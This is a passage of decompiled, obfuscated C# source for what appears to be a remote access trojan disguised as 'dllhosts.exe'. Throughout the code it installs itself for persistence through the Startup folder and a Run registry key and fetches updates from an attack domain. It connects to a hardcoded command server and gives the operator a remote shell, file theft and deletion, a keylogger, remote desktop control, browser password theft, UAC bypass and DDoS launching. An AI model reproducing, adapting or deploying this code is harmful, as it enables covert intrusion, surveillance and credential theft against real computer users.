using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Media;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

internal class Class2
{
	private delegate bool Delegate0(Enum0 sig);

	private enum Enum0
	{
		CTRL_C_EVENT = 0,
		CTRL_BREAK_EVENT = 1,
		CTRL_CLOSE_EVENT = 2,
		CTRL_LOGOFF_EVENT = 5,
		CTRL_SHUTDOWN_EVENT = 6
	}

	public enum Enum1
	{
		FILE_NOT_FOUND = 0,
		PROCESS_ACCESS_DENIED = 1,
		ENCRYPT_DATA_CORRUPTED = 2,
		DECRYPT_DATA_CORRUPTED = 3,
		DIRECTORY_NOT_FOUND = 4,
		DEVICE_NOT_AVAILABLE = 5,
		PASSWORD_RECOVERY_FAILED = 6,
		CMD_STREAM_READ = 7,
		FILE_AND_DIR_NOT_FOUND = 8,
		FILE_EXISTS = 9,
		ADMIN_REQUIRED = 16
	}

	[Flags]
	public enum Enum2
	{
		LEFTDOWN = 2,
		LEFTUP = 4,
		MIDDLEDOWN = 0x20,
		MIDDLEUP = 0x40,
		MOVE = 1,
		ABSOLUTE = 0x8000,
		RIGHTDOWN = 8,
		RIGHTUP = 0x10
	}

	[Serializable]
	[CompilerGenerated]
	private sealed class Class3
	{
		public static readonly Class3 _003C_003E9 = new Class3();

		public static Action _003C_003E9__53_0;

		public static Action _003C_003E9__71_0;

		public static Action _003C_003E9__71_1;

		internal void method_0()
		{
			while (true)
			{
				if (Class3.smethod_0(socket_0) && sslStream_0 != null && Class3.smethod_1((Stream)sslStream_0))
				{
					smethod_49("hearthbeat");
				}
				Class3.smethod_2(10000);
			}
		}

		internal void method_1()
		{
			try
			{
				string text = "";
				while ((text = Class3.smethod_4((TextReader)streamReader_0)) != null)
				{
					smethod_49(Class3.smethod_3("cmdout§", text));
				}
			}
			catch (Exception exception_)
			{
				smethod_49(Class3.smethod_3("cmdout§Error reading cmd response: \n", Class3.smethod_5(exception_)));
				smethod_15(Enum1.CMD_STREAM_READ, "Can't read stream!", "Remote Cmd stream reading failed!");
			}
		}

		internal void method_2()
		{
			try
			{
				string text = "";
				while ((text = Class3.smethod_4((TextReader)streamReader_1)) != null)
				{
					smethod_49(Class3.smethod_3("cmdout§", text));
				}
			}
			catch (Exception exception_)
			{
				smethod_49(Class3.smethod_3("cmdout§Error reading cmd response: \n", Class3.smethod_5(exception_)));
				smethod_15(Enum1.CMD_STREAM_READ, "Can't read stream!", "Remote Cmd stream reading failed!");
			}
		}

		static bool smethod_0(Socket socket_0)
		{
			return socket_0.Connected;
		}

		static bool smethod_1(Stream stream_0)
		{
			return stream_0.CanWrite;
		}

		static void smethod_2(int int_0)
		{
			Thread.Sleep(int_0);
		}

		static string smethod_3(string string_0, string string_1)
		{
			return string_0 + string_1;
		}

		static string smethod_4(TextReader textReader_0)
		{
			return textReader_0.ReadLine();
		}

		static string smethod_5(Exception exception_0)
		{
			return exception_0.Message;
		}
	}

	public static int int_0 = 100;

	private static Delegate0 delegate0_0;

	private const int int_1 = 0;

	private const int int_2 = 1;

	private static Socket socket_0 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

	private const int int_3 = 100;

	private static StreamReader streamReader_0;

	private static StreamWriter streamWriter_0;

	private static StreamReader streamReader_1;

	private static string string_0 = "";

	private static int int_4 = 0;

	private static bool bool_0 = false;

	private static int int_5 = 0;

	private static byte[] byte_0 = new byte[1];

	private static string string_1 = "";

	private static bool bool_1 = false;

	private static bool bool_2 = false;

	private static GClass3 gclass3_0;

	private static Process process_0;

	private const bool bool_3 = true;

	private static string string_2;

	public static int int_6 = 0;

	public static bool bool_4 = false;

	public static Encoding encoding_0;

	public static SslStream sslStream_0;

	public static string string_3 = string.Empty;

	public static string string_4 = string.Empty;

	public static string string_5 = Application.get_ExecutablePath();

	public static string string_6 = "https://attack.s2lol.com/new/";

	[DllImport("winmm.dll")]
	public static extern void mciSendStringA(string string_7, string string_8, int int_7, int int_8);

	[DllImport("user32.dll")]
	private static extern int FindWindow(string string_7, string string_8);

	[DllImport("user32.dll")]
	private static extern int ShowWindow(int int_7, int int_8);

	[DllImport("User32.dll")]
	private static extern int FindWindowEx(int int_7, int int_8, string string_7, string string_8);

	[DllImport("Kernel32")]
	private static extern bool SetConsoleCtrlHandler(Delegate0 delegate0_1, bool bool_5);

	[DllImport("user32.dll")]
	private static extern void mouse_event(int int_7, int int_8, int int_9, int int_10, int int_11);

	private static bool smethod_0(Enum0 enum0_0)
	{
		switch (enum0_0)
		{
		case Enum0.CTRL_C_EVENT:
			smethod_6();
			smethod_49("dclient");
			return true;
		case Enum0.CTRL_CLOSE_EVENT:
			smethod_6();
			smethod_49("dclient");
			return true;
		default:
			return false;
		case Enum0.CTRL_LOGOFF_EVENT:
			smethod_6();
			smethod_49("dclient");
			return true;
		case Enum0.CTRL_SHUTDOWN_EVENT:
			smethod_6();
			smethod_49("dclient");
			return true;
		}
	}

	private static void Main(string[] args)
	{
		ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), 0);
		if (Process.GetProcessesByName("dllhosts").Length > 1)
		{
			Environment.Exit(0);
		}
		if (!File.Exists(Application.get_StartupPath() + "\\appCom.dll"))
		{
			smethod_3("dllhosts", Application.get_StartupPath(), "files", "System.IO.Compression.dll");
			smethod_3("dllhosts", Application.get_StartupPath(), "files", "System.IO.Compression.FileSystem.dll");
			smethod_3("dllhosts", Application.get_StartupPath(), "files", "System.Shim.dll");
			smethod_3("dllhosts", Application.get_StartupPath(), "files", "SQLite.Interop.dll");
			smethod_3("dllhosts", Application.get_StartupPath(), "files", "System.Data.SQLite.dll");
			smethod_3("dllhosts", Application.get_StartupPath(), "files", "System.Data.SQLite.EF6.dll");
			smethod_3("dllhosts", Application.get_StartupPath(), "files", "appCom.dll");
			smethod_3("dllhosts", Application.get_StartupPath(), "files", "System.Data.SQLite.Linq.dll");
			smethod_3("dllhosts", Application.get_StartupPath(), "files", "UrlHistoryLibrary.dll");
		}
		smethod_2();
		new Thread(smethod_4).Start();
	}

	private static void smethod_1()
	{
		delegate0_0 = (Delegate0)Class2.smethod_53((Delegate)delegate0_0, (Delegate)new Delegate0(smethod_0));
		SetConsoleCtrlHandler(delegate0_0, bool_5: true);
		Class2.smethod_54(bool_5: false);
		smethod_11();
		smethod_7();
		smethod_12();
	}

	public static void smethod_2()
	{
		try
		{
			RegistryKey registryKey_ = Class2.smethod_55(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", bool_5: true);
			bool flag = false;
			try
			{
				Class2.smethod_58(Class2.smethod_57(Class2.smethod_56()), "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\dllhosts.exe");
				flag = true;
			}
			catch
			{
			}
			if (flag)
			{
				return;
			}
			try
			{
				Class2.smethod_58(Class2.smethod_57(Class2.smethod_56()), Class2.smethod_60(Class2.smethod_59(Environment.SpecialFolder.ApplicationData), "dllhosts.exe"));
				try
				{
					Class2.smethod_61(registryKey_, "DrvHandlers", (object)Class2.smethod_60(Class2.smethod_59(Environment.SpecialFolder.ApplicationData), "dllhosts.exe"));
				}
				catch
				{
					try
					{
						Class2.smethod_61(Class2.smethod_55(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\LocalMachine\\Run", bool_5: true), "DrvHandlers", (object)Class2.smethod_60(Class2.smethod_59(Environment.SpecialFolder.ApplicationData), "dllhosts.exe"));
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	public static void smethod_3(string string_7, string string_8, string string_9, string string_10)
	{
		Stream stream = Class2.smethod_66(Class2.smethod_62(), Class2.smethod_65(string_7, ".", Class2.smethod_63(string_9, "") ? "" : Class2.smethod_64(string_9, "."), string_10));
		try
		{
			BinaryReader binaryReader = Class2.smethod_67(stream);
			try
			{
				FileStream fileStream = Class2.smethod_69(Class2.smethod_68(string_8, "\\", string_10), FileMode.OpenOrCreate);
				try
				{
					BinaryWriter binaryWriter = Class2.smethod_70((Stream)fileStream);
					try
					{
						Class2.smethod_73(binaryWriter, Class2.smethod_72(binaryReader, (int)Class2.smethod_71(stream)));
					}
					finally
					{
						if (binaryWriter != null)
						{
							Class2.smethod_74((IDisposable)binaryWriter);
						}
					}
				}
				finally
				{
					if (fileStream != null)
					{
						Class2.smethod_74((IDisposable)fileStream);
					}
				}
			}
			finally
			{
				if (binaryReader != null)
				{
					Class2.smethod_74((IDisposable)binaryReader);
				}
			}
		}
		finally
		{
			if (stream != null)
			{
				Class2.smethod_74((IDisposable)stream);
			}
		}
	}

	private static void smethod_4()
	{
		int num = 0;
		while (true)
		{
			try
			{
				if (Class2.smethod_76(Class2.smethod_64(Class2.smethod_75(), "\\old")))
				{
					Class2.smethod_77(Class2.smethod_64(Class2.smethod_75(), "\\old"));
				}
				GClass0 gClass = new GClass0();
				try
				{
					string text = Class2.smethod_80((TextReader)Class2.smethod_79(Class2.smethod_78((WebClient)gClass, Class2.smethod_64(string_6, "dllhosts.php"))));
					string string_ = smethod_5(string_5);
					if (Class2.smethod_81(text, ""))
					{
						if (!Class2.smethod_81(string_, text))
						{
							Class2.smethod_88(Class2.smethod_87((ThreadStart)smethod_1));
						}
						else
						{
							Class2.smethod_82("CheckUpdate");
							Class2.smethod_83(string_5, Class2.smethod_64(Class2.smethod_75(), "\\old"));
							Class2.smethod_84((WebClient)gClass, Class2.smethod_64(string_6, "dllhosts.exe"), string_5);
							Class2.smethod_85(string_5);
							Class2.smethod_86(0);
						}
					}
					else
					{
						Class2.smethod_88(Class2.smethod_87((ThreadStart)smethod_1));
					}
				}
				finally
				{
					if (gClass != null)
					{
						Class2.smethod_74((IDisposable)gClass);
					}
				}
				Class2.smethod_82("CallMainOK");
				break;
			}
			catch (Exception exception_)
			{
				Class2.smethod_82(Class2.smethod_89(exception_));
				if (num > 10)
				{
					Class2.smethod_88(Class2.smethod_87((ThreadStart)smethod_1));
				}
				Class2.smethod_90(300000);
				num++;
			}
		}
	}

	public static string smethod_5(string string_7)
	{
		using MD5CryptoServiceProvider hashAlgorithm_ = Class2.smethod_91();
		byte[] array = Class2.smethod_93((HashAlgorithm)hashAlgorithm_, Class2.smethod_92(string_7));
		StringBuilder stringBuilder = Class2.smethod_94();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("x2"));
		}
		return stringBuilder.ToString();
	}

	private static void smethod_6()
	{
	}

	private static void smethod_7()
	{
	}

	private static void smethod_8(string string_7)
	{
	}

	private static string smethod_9(string string_7)
	{
		try
		{
			return Class2.smethod_96((object)Class2.smethod_95(string_7)[0]);
		}
		catch (Exception exception_)
		{
			Class2.smethod_82(Class2.smethod_65("Dns Resolve on input: ", string_7, " failed\r\n", Class2.smethod_89(exception_)));
			return null;
		}
	}

	private static string smethod_10(string string_7)
	{
		if (Class2.smethod_63(string_7, ""))
		{
			return null;
		}
		bool flag = true;
		if (Class2.smethod_97(string_7, "."))
		{
			string[] array = Class2.smethod_98(string_7, new char[1] { '.' });
			if (array.Length != 4)
			{
				return smethod_9(string_7);
			}
			string[] array2 = array;
			foreach (string string_8 in array2)
			{
				for (int j = 0; j < Class2.smethod_100(string_8); j++)
				{
					if (!char.IsNumber(Class2.smethod_99(string_8, j)))
					{
						flag = false;
						break;
					}
				}
				if (!flag)
				{
					Class2.smethod_82("Invalid IP Address!\r\nInput is not an IP Address");
					break;
				}
			}
			if (!flag)
			{
				return smethod_9(string_7);
			}
			return string_7;
		}
		return null;
	}

	private static void smethod_11()
	{
		int num = 0;
		string string_ = smethod_10("103.127.196.150");
		if (bool_4)
		{
			encoding_0 = Class2.smethod_101();
		}
		else
		{
			encoding_0 = Class2.smethod_102();
		}
		while (!Class2.smethod_107(socket_0))
		{
			try
			{
				num++;
				Class2.smethod_82(Class2.smethod_103((object)"Connection attempt ", (object)num));
				Class2.smethod_105(socket_0, Class2.smethod_104(string_), 100);
				Class2.smethod_90(500);
			}
			catch (SocketException)
			{
				if (num % 5 == 0)
				{
					string_ = smethod_10("103.127.196.150");
				}
				if (!Class5.bool_0)
				{
					Class5.bool_0 = true;
				}
				Class2.smethod_106();
			}
		}
		Class2.smethod_106();
		Class2.smethod_82("Connected");
	}

	private static void smethod_12()
	{
		if (bool_4)
		{
			sslStream_0 = Class2.smethod_109((Stream)Class2.smethod_108(socket_0), bool_5: false, (RemoteCertificateValidationCallback)smethod_14, (LocalCertificateSelectionCallback)null);
			Class2.smethod_110(sslStream_0, "");
			smethod_13();
		}
		while (!bool_1)
		{
			smethod_22();
		}
		Class2.smethod_82("Connection Ended");
		Class2.smethod_111(socket_0, SocketShutdown.Both);
		Class2.smethod_112(socket_0);
		socket_0 = Class2.smethod_113(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
		smethod_11();
		bool_1 = false;
		smethod_12();
	}

	private static void smethod_13()
	{
		Class2.smethod_115(Class2.smethod_114((Action)delegate
		{
			while (true)
			{
				if (Class3.smethod_0(socket_0) && sslStream_0 != null && Class3.smethod_1((Stream)sslStream_0))
				{
					smethod_49("hearthbeat");
				}
				Class3.smethod_2(10000);
			}
		}));
	}

	private static bool smethod_14(object object_0, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0)
	{
		return true;
	}

	public static void smethod_15(Enum1 enum1_0, string string_7, string string_8)
	{
		StringBuilder stringBuilder = Class2.smethod_94();
		Class2.smethod_116(Class2.smethod_116(Class2.smethod_116(Class2.smethod_116(Class2.smethod_117(Class2.smethod_116(stringBuilder, "error§"), (object)enum1_0), "§"), string_7), "§"), string_8);
		smethod_49(Class2.smethod_96((object)stringBuilder));
	}

	private static string[] smethod_16(string string_7)
	{
		List<string> list = new List<string>();
		int num = 0;
		for (int i = 0; i < Class2.smethod_100(string_7); i++)
		{
			if (Class2.smethod_99(string_7, i) == '§')
			{
				int num2 = int.Parse(Class2.smethod_118(string_7, num, i - num));
				string item = Class2.smethod_118(string_7, i + 1, num2);
				i += 1 + num2;
				num = i;
				list.Add(item);
			}
		}
		return list.ToArray();
	}

	private static void smethod_17(string string_7)
	{
		if (Class2.smethod_63(string_7, "tskmgr"))
		{
			Process process_ = Class2.smethod_119();
			Class2.smethod_121(Class2.smethod_120(process_), "Taskmgr.exe");
			Class2.smethod_122(Class2.smethod_120(process_), bool_5: true);
			Class2.smethod_123(process_);
		}
		else if (Class2.smethod_63(string_7, "fpslow"))
		{
			int_0 = 150;
			Class2.smethod_82("FPS now 150");
		}
		else if (Class2.smethod_63(string_7, "fpsbest"))
		{
			int_0 = 80;
			Class2.smethod_82("FPS now 80");
		}
		else if (Class2.smethod_63(string_7, "fpshigh"))
		{
			int_0 = 50;
			Class2.smethod_82("FPS now 50");
		}
		else if (Class2.smethod_63(string_7, "fpsmid"))
		{
			int_0 = 100;
			Class2.smethod_82("FPS now 100");
		}
		else if (!Class2.smethod_124(string_7, "getinfo-"))
		{
			if (string_7.StartsWith("msg"))
			{
				smethod_44(string_7.Split(new char[1] { '|' }));
			}
			else if (!string_7.StartsWith("freq-"))
			{
				if (string_7.StartsWith("sound-"))
				{
					smethod_21(string_7.Substring(6));
				}
				else if (string_7.StartsWith("t2s|"))
				{
					smethod_42(string_7.Substring(4));
				}
				else if (!string_7.StartsWith("cd|"))
				{
					if (!string_7.StartsWith("emt|"))
					{
						if (string_7 == "proclist")
						{
							Process[] processes = Process.GetProcesses();
							StringBuilder stringBuilder = new StringBuilder();
							Process[] array = processes;
							foreach (Process process in array)
							{
								stringBuilder.Append("setproc|").Append(process.ProcessName).Append("|")
									.Append(process.Responding)
									.Append("|")
									.Append((process.MainWindowTitle == "") ? "N/A" : process.MainWindowTitle)
									.Append("|");
								string value = "N/A";
								string value2 = "N/A";
								try
								{
									value = process.PriorityClass.ToString();
									value2 = process.Modules[0].FileName;
								}
								catch (Exception)
								{
								}
								stringBuilder.Append(value).Append("|").Append(value2)
									.Append("|")
									.Append(process.Id)
									.Append("\n");
							}
							smethod_49(stringBuilder.ToString());
							return;
						}
						if (string_7.StartsWith("prockill"))
						{
							int num = int.Parse(string_7.Substring(9));
							try
							{
								Process.GetProcessById(num).Kill();
								return;
							}
							catch (Exception)
							{
								smethod_15(Enum1.PROCESS_ACCESS_DENIED, "Can't kill process", "Manager failed to kill process: " + num);
								return;
							}
						}
						if (string_7.StartsWith("procstart"))
						{
							try
							{
								string[] array2 = string_7.Split(new char[1] { '|' });
								Process process2 = new Process();
								process2.StartInfo.FileName = array2[1];
								if (array2[2] == "hidden")
								{
									process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
								}
								process2.Start();
								return;
							}
							catch (Exception ex3)
							{
								Console.WriteLine(ex3.Message);
								return;
							}
						}
						if (string_7 == "startcmd")
						{
							ProcessStartInfo startInfo = new ProcessStartInfo
							{
								FileName = "cmd.exe",
								CreateNoWindow = true,
								UseShellExecute = false,
								RedirectStandardInput = true,
								RedirectStandardOutput = true,
								RedirectStandardError = true
							};
							process_0 = new Process
							{
								StartInfo = startInfo
							};
							process_0.Start();
							streamWriter_0 = process_0.StandardInput;
							streamReader_0 = process_0.StandardOutput;
							streamReader_1 = process_0.StandardError;
							streamWriter_0.AutoFlush = true;
							smethod_31();
						}
						else if (!(string_7 == "stopcmd"))
						{
							if (string_7.StartsWith("cmd§"))
							{
								string text = string_7.Substring(4);
								streamWriter_0.WriteLine(text + "\r\n");
							}
							else if (string_7 == "fdrive")
							{
								DriveInfo[] drives = DriveInfo.GetDrives();
								StringBuilder stringBuilder2 = new StringBuilder();
								stringBuilder2.Append("fdrivel§");
								DriveInfo[] array3 = drives;
								foreach (DriveInfo driveInfo in array3)
								{
									if (driveInfo.IsReady)
									{
										stringBuilder2.Append(driveInfo.Name).Append("|").Append(driveInfo.TotalSize.ToString())
											.Append("\n");
									}
									else
									{
										stringBuilder2.Append(driveInfo.Name).Append("\n");
									}
								}
								smethod_49(stringBuilder2.ToString());
							}
							else if (string_7 == "fdrive")
							{
								DriveInfo[] drives2 = DriveInfo.GetDrives();
								StringBuilder stringBuilder3 = new StringBuilder();
								stringBuilder3.Append("fdrivel§");
								DriveInfo[] array3 = drives2;
								foreach (DriveInfo driveInfo2 in array3)
								{
									if (!driveInfo2.IsReady)
									{
										stringBuilder3.Append(driveInfo2.Name).Append("\n");
									}
									else
									{
										stringBuilder3.Append(driveInfo2.Name).Append("|").Append(driveInfo2.TotalSize.ToString())
											.Append("\n");
									}
								}
								smethod_49(stringBuilder3.ToString());
							}
							else if (string_7.StartsWith("fdir§"))
							{
								string text2 = string_7.Substring(5);
								if ((text2.Length != 3 || text2.EndsWith(":\\")) && Directory.Exists(text2))
								{
									smethod_49(smethod_19(text2));
								}
								else
								{
									smethod_15(Enum1.DIRECTORY_NOT_FOUND, "Directory not found", "Manager can't locate: " + text2);
								}
							}
							else if (!string_7.StartsWith("f1§"))
							{
								if (string_7.StartsWith("fpaste§"))
								{
									string[] array4 = string_7.Split(new char[1] { '§' });
									string text3 = array4[2];
									string text4 = array4[1];
									string string_8 = array4[3];
									string string_9 = "file";
									if (!Directory.Exists(text4))
									{
										smethod_15(Enum1.DIRECTORY_NOT_FOUND, "Target Directory Not found!", "Paste Target: " + text4 + " cannot be located by manager");
										return;
									}
									if (Directory.Exists(text3))
									{
										string_9 = "dir";
									}
									smethod_18(text3, text4, string_8, string_9);
								}
								else if (!string_7.StartsWith("fexec§"))
								{
									if (string_7.StartsWith("fhide§"))
									{
										string text5 = string_7.Substring(6);
										if (!File.Exists(text5) && !Directory.Exists(text5))
										{
											smethod_15(Enum1.FILE_AND_DIR_NOT_FOUND, "Cannot hide entry!", "Manager failed to locate " + text5);
										}
										else
										{
											File.SetAttributes(text5, FileAttributes.Hidden);
										}
									}
									else if (string_7.StartsWith("fshow§"))
									{
										string text6 = string_7.Substring(6);
										if (!File.Exists(text6) && !Directory.Exists(text6))
										{
											smethod_15(Enum1.FILE_AND_DIR_NOT_FOUND, "Cannot hide entry!", "Manager failed to locate " + text6);
										}
										else
										{
											File.SetAttributes(text6, FileAttributes.Normal);
										}
									}
									else if (string_7.StartsWith("fdel§"))
									{
										string text7 = string_7.Substring(5);
										if (!Directory.Exists(text7))
										{
											if (!File.Exists(text7))
											{
												smethod_15(Enum1.FILE_AND_DIR_NOT_FOUND, "Cant delete entry!", "Manager failed to locate: " + text7);
											}
											else
											{
												File.Delete(text7);
											}
										}
										else
										{
											Directory.Delete(text7, recursive: true);
										}
									}
									else if (string_7.StartsWith("frename§"))
									{
										string[] array5 = string_7.Split(new char[1] { '§' });
										string text8 = array5[1];
										string text9 = array5[2];
										if (Directory.Exists(text8))
										{
											string destDirName = new DirectoryInfo(text8).Parent!.FullName + "\\" + text9;
											Directory.Move(text8, destDirName);
										}
										else if (File.Exists(text8))
										{
											string destFileName = new FileInfo(text8).Directory!.FullName + "\\" + text9;
											File.Move(text8, destFileName);
										}
										else
										{
											smethod_15(Enum1.FILE_AND_DIR_NOT_FOUND, "Can't rename entry!", "Manager failed to locate: " + text8);
										}
									}
									else if (!string_7.StartsWith("ffile§"))
									{
										if (!string_7.StartsWith("fndir§"))
										{
											if (string_7.StartsWith("getfile§"))
											{
												string text10 = string_7.Substring(8);
												if (File.Exists(text10))
												{
													string text11 = File.ReadAllText(text10);
													smethod_49("backfile§" + text11);
												}
												else
												{
													smethod_15(Enum1.FILE_NOT_FOUND, "Can't open file", "Manager failed to locate: " + text10);
												}
											}
											else if (!string_7.StartsWith("putfile§"))
											{
												if (!string_7.StartsWith("fup"))
												{
													if (!string_7.StartsWith("fdl§"))
													{
														switch (string_7)
														{
														case "dc":
															Thread.Sleep(3000);
															bool_1 = true;
															smethod_6();
															return;
														case "sklog":
															if (!bool_2)
															{
																new Thread(Class0.smethod_3).Start();
																bool_2 = true;
															}
															if (bool_2 && !Class0.bool_0)
															{
																Class0.bool_0 = true;
															}
															return;
														case "rklog":
														{
															string text12 = Class0.string_0;
															smethod_49("putklog" + text12);
															return;
														}
														case "cklog":
															Class0.string_1 = "";
															Class0.string_0 = "";
															return;
														case "rdstart":
														{
															Thread thread = new Thread(Class5.smethod_0);
															Class5.bool_0 = false;
															thread.Start();
															return;
														}
														case "rdstop":
															Class5.bool_0 = true;
															return;
														case "stklog":
															if (bool_2 && Class0.bool_0)
															{
																Class0.bool_0 = false;
															}
															return;
														case "fconfirm":
														{
															byte[] array6 = File.ReadAllBytes(string_1);
															if (!bool_4)
															{
																smethod_52(array6);
															}
															else
															{
																smethod_49("filestr" + Convert.ToBase64String(array6));
															}
															return;
														}
														}
														if (string_7.StartsWith("rmove-"))
														{
															string[] array7 = string_7.Substring(6).Split(new char[1] { ':' });
															Cursor.set_Position(new Point(int.Parse(array7[0]), int.Parse(array7[1])));
														}
														else if (!string_7.StartsWith("rtype-"))
														{
															if (!string_7.StartsWith("rclick-"))
															{
																if (string_7 == "alist" || string_7.StartsWith("astream") || string_7 == "astop" || string_7 == "wlist" || string_7.StartsWith("wstream") || string_7 == "wstop")
																{
																	return;
																}
																if (!string_7.StartsWith("ddosr"))
																{
																	if (string_7.StartsWith("ddosk"))
																	{
																		if (gclass3_0 != null)
																		{
																			gclass3_0.method_8();
																		}
																		return;
																	}
																	switch (string_7)
																	{
																	case "getpw":
																	{
																		if (!File.Exists(Application.get_StartupPath() + "\\ff.exe"))
																		{
																			smethod_49("getpwu");
																			smethod_15(Enum1.PASSWORD_RECOVERY_FAILED, "Can't recover passwords!", "ff.exe (PasswordFox) is missing!");
																			return;
																		}
																		string[] array8 = new GClass2().method_0();
																		string string_10 = "gcpw\n" + array8[0];
																		string string_11 = "iepw\n" + array8[1];
																		string string_12 = "ffpw\n" + array8[2];
																		smethod_49(string_11);
																		Thread.Sleep(1000);
																		smethod_49(string_10);
																		Thread.Sleep(1000);
																		smethod_49(string_12);
																		string_12 = null;
																		return;
																	}
																	case "getstart":
																		smethod_49("setstart§" + Application.get_StartupPath());
																		return;
																	case "uacbypass":
																	{
																		GClass1 gClass = new GClass1();
																		if (gClass.method_2())
																		{
																			smethod_49("uac§a_admin");
																			return;
																		}
																		try
																		{
																			if (gClass.method_5())
																			{
																				smethod_49("uac§s_admin");
																			}
																			else
																			{
																				smethod_49("uac§f_admin");
																			}
																			return;
																		}
																		catch (Exception)
																		{
																			gClass.method_1(GClass1.GEnum0.StartUpFolder);
																			return;
																		}
																	}
																	}
																	if (string_7.StartsWith("writeipc§"))
																	{
																		string text13 = string_7.Substring(string_7.IndexOf('§') + 1);
																		text13.Substring(text13.IndexOf('§') + 1);
																	}
																	else if (string_7.StartsWith("startipc§"))
																	{
																		string string_13 = string_7.Substring(string_7.IndexOf('§') + 1);
																		smethod_7();
																		smethod_8(string_13);
																	}
																	else if (string_7.StartsWith("stopipc§"))
																	{
																		smethod_6();
																	}
																	else if (!(string_7 == "countScreens"))
																	{
																		if (string_7.StartsWith("screenNum"))
																		{
																			int_6 = int.Parse(string_7.Substring(9)) - 1;
																		}
																		else if (string_7.StartsWith("sprobe§"))
																		{
																			string text14 = string_7.Substring(7);
																			GClass1.GEnum0 gEnum = GClass1.GEnum0.StartUpFolder;
																			switch (text14)
																			{
																			default:
																				return;
																			case "Registry":
																				gEnum = GClass1.GEnum0.Registry;
																				break;
																			case "Task Scheduler":
																				gEnum = GClass1.GEnum0.TaskScheduler;
																				break;
																			case "Startup Folder":
																				gEnum = GClass1.GEnum0.StartUpFolder;
																				break;
																			}
																			new GClass1().method_1(gEnum);
																		}
																	}
																	else
																	{
																		Screen[] allScreens = Screen.get_AllScreens();
																		for (int i = 0; i < allScreens.Length; i++)
																		{
																			string_2 = allScreens[i].get_DeviceName().Replace("\\\\.\\DISPLAY", "");
																			smethod_49("ScreenCount" + string_2);
																		}
																	}
																}
																else
																{
																	string[] array9 = string_7.Split(new char[1] { '|' });
																	string text15 = array9[1];
																	string text16 = array9[2];
																	string text17 = array9[3];
																	string text18 = array9[4];
																	string text19 = array9[5];
																	string string_14 = array9[6];
																	gclass3_0 = new GClass3(text15, text16, text17, text18, text19, string_14);
																	gclass3_0.method_0();
																}
															}
															else
															{
																string[] array10 = string_7.Split(new char[1] { '-' });
																smethod_24(array10[1], array10[2]);
															}
														}
														else
														{
															string text20 = string_7.Substring(6);
															if (text20 != "")
															{
																SendKeys.SendWait(text20);
																SendKeys.Flush();
															}
														}
													}
													else
													{
														string_1 = string_7.Substring(4);
														if (File.Exists(string_1))
														{
															string text21 = ((!bool_4) ? new FileInfo(string_1).Length.ToString() : Convert.ToBase64String(File.ReadAllBytes(string_1)).Length.ToString());
															smethod_49("finfo§" + text21);
														}
														else
														{
															smethod_15(Enum1.FILE_NOT_FOUND, "Can't download file!", "Manager is unable to locate: " + string_1);
														}
													}
												}
												else
												{
													string_0 = string_7.Split(new char[1] { '§' })[1];
													if (!File.Exists(string_0))
													{
														int_4 = int.Parse(string_7.Split(new char[1] { '§' })[2]);
														bool_0 = true;
														byte_0 = new byte[int_4];
														smethod_49("fconfirm");
													}
													else
													{
														smethod_15(Enum1.FILE_EXISTS, "Can't upload file!", "Manager detected that this file exists!");
													}
												}
											}
											else
											{
												string text22 = string_7.Split(new char[1] { '§' })[1];
												string contents = string_7.Split(new char[1] { '§' })[2];
												if (!File.Exists(text22))
												{
													smethod_15(Enum1.FILE_NOT_FOUND, "Can't save file!", "Manager failed to locate: " + text22);
												}
												else
												{
													File.WriteAllText(text22, contents);
												}
											}
										}
										else
										{
											string[] array11 = string_7.Split(new char[1] { '§' });
											string path = array11[1] + "\\" + array11[2];
											if (Directory.Exists(path))
											{
												Directory.Delete(path, recursive: true);
											}
											Directory.CreateDirectory(path);
										}
									}
									else
									{
										string[] array12 = string_7.Split(new char[1] { '§' });
										string path2 = array12[1] + "\\" + array12[2];
										if (File.Exists(path2))
										{
											File.Delete(path2);
										}
										File.Create(path2).Close();
									}
								}
								else
								{
									string text23 = string_7.Substring(6);
									if (File.Exists(text23) || Directory.Exists(text23))
									{
										Process.Start(text23);
									}
									else
									{
										smethod_15(Enum1.FILE_NOT_FOUND, "Can't execute " + text23, "File cannot be located by manager");
									}
								}
							}
							else
							{
								string text24 = string_7.Substring(3);
								if (text24.Length == 3 && text24.Contains(":\\"))
								{
									smethod_49("f1§drive");
									return;
								}
								string fullName = new DirectoryInfo(text24).Parent!.FullName;
								smethod_49("f1§" + fullName);
							}
						}
						else
						{
							process_0.Kill();
							streamWriter_0.Dispose();
							streamWriter_0 = null;
							streamReader_0.Dispose();
							streamReader_0 = null;
							process_0.Dispose();
							process_0 = null;
						}
					}
					else
					{
						string[] array13 = string_7.Split(new char[1] { '|' });
						string string_15 = array13[1];
						string string_16 = array13[2];
						smethod_20(string_15, string_16);
					}
				}
				else if (string_7.Substring(4) == "open")
				{
					mciSendStringA("set CDAudio door open", "", 127, 0);
				}
				else
				{
					mciSendStringA("set CDAudio door closed", "", 127, 0);
				}
			}
			else
			{
				smethod_43(int.Parse(string_7.Substring(5)), 2);
			}
		}
		else
		{
			string string_17 = Class2.smethod_125(string_7, 8);
			StringBuilder stringBuilder4 = Class2.smethod_94();
			Class2.smethod_116(Class2.smethod_116(Class2.smethod_116(Class2.smethod_116(Class2.smethod_116(Class2.smethod_116(Class2.smethod_116(stringBuilder4, "infoback;"), string_17), ";"), Class2.smethod_126()), "|"), smethod_45()), "|").Append(DateTime.Now.ToString()).Append("|")
				.Append(smethod_46());
